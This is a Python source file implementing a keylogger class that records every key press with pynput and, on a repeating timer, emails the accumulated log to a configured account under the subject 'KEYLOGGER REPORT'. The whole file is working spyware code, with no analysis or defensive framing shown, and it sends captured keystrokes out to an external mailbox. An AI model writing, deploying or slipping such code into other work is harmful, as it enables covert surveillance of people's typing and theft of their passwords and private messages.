import pynput.keyboard
import threading
import smtplib
from MailSender import *



class Keylogger:
    def __init__(self, time_interval,email, passwd):
        self.log = "Started"
        self.interval = time_interval
        self.email = email
        self.passwd = passwd

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = ""
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        SUBJECT = "KEYLOGGER REPORT"
        self.log = 'Subject: {}\n\n{}'.format(SUBJECT, self.log)
        send_mail(self.email, self.passwd, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        return "[+] Keylogger started!"